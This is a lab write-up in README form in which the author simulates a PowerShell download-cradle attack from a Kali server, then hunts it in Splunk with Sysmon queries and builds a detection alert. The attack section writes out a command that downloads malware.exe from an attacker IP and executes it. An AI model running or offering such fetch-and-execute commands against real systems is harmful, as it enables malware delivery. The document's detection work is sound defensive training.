# Splunk-SIEM-Threat-Hunting-Lab
# Enterprise SIEM & Threat Hunting Automation Lab

## 🎯 Objective
The goal of this project was to engineer a fully functional Security Information and Event Management (SIEM) pipeline in a home lab environment. This lab simulates a real-world Security Operations Center (SOC) workflow by ingesting Windows endpoint telemetry into Splunk, executing a "Living off the Land" (LotL) attack, hunting the telemetry, and building automated detection alerts.

---

## 🏗️ Architecture & Technologies
* **SIEM:** Splunk Enterprise
* **Endpoint Telemetry:** Windows Sysmon (System Monitor)
* **Data Parsing:** Splunk Add-on for Sysmon (TA-Sysmon)
* **Attacker Machine:** Kali Linux (Python HTTP Server)
* **Victim Machine:** Windows 11
* **Techniques Used:** PowerShell Download Cradles, Log Analysis, Custom Alerting (SPL)

---

## ⚔️ Red Team: Simulating the Attack
To test the defense pipeline, I simulated a common ransomware delivery tactic: silently downloading a malicious payload using built-in administrative tools.

### 1. Command & Control Server
Hosted a simulated malware payload on Kali Linux using a local web server.

```bash
python3 -m http.server 8000
```

### 2. Malicious Execution (Victim Machine)
Executed a PowerShell download cradle on the Windows endpoint to pull the file from the attacker server and save it to the hidden Temporary directory.

```powershell
Invoke-WebRequest -Uri "[http://10.240.24.204:8000/malware.exe](http://10.240.24.204:8000/malware.exe)" -OutFile "$env:TEMP\malware.exe"
Start-Process "$env:TEMP\malware.exe"
```

---

## 🛡️ Blue Team: Threat Hunting in Splunk
With the attack executed, I pivoted to Splunk to manually hunt the telemetry and trace the attacker's lateral movement.

### Hunting Network Connections (Event ID 3)
I queried the Sysmon logs to find the exact moment PowerShell reached out over the network to the attacker's IP address.

```spl
index="main" EventCode=3 Image="*powershell.exe*" | table _time, Image, DestinationIp, DestinationPort
```

> **[Insert Screenshot of Splunk showing the EventCode 3 table results here]**

### Hunting Process Creation (Event ID 1)
After confirming the download, I tracked the execution of the downloaded payload, confirming it was launched directly from the user's Temp folder.

```spl
index="main" EventCode=1 Image="*malware.exe*" | table _time, Image, CommandLine, User, ParentImage
```

> **[Insert Screenshot of Splunk showing the EventCode 1 table results here]**

---

## 🚨 Automation: Building a SOC Alert
To transition from manual hunting to automated defense, I engineered a custom Splunk alert based on the behavioral indicators of the attack.

Real-world attackers constantly change malware filenames, so I built the detection rule to trigger on any executable launching from the Windows Temp folder.

**Custom SPL Detection Rule:**

```spl
index="main" EventCode=1 Image="*\\Temp\\*.exe"
```

> **[Insert Screenshot of the Triggered Alerts dashboard in Splunk here]**

---

## 🧹 Incident Response & Remediation
Once the automated alert successfully triggered, I completed the incident response lifecycle by:

* Identifying the compromised user account and parent processes.
* Extracting the Indicators of Compromise (IOCs).
* Eradicating the threat by terminating the suspicious process and permanently wiping the payload from the `$env:TEMP` directory.

---
**Author:** Yashwanth H L
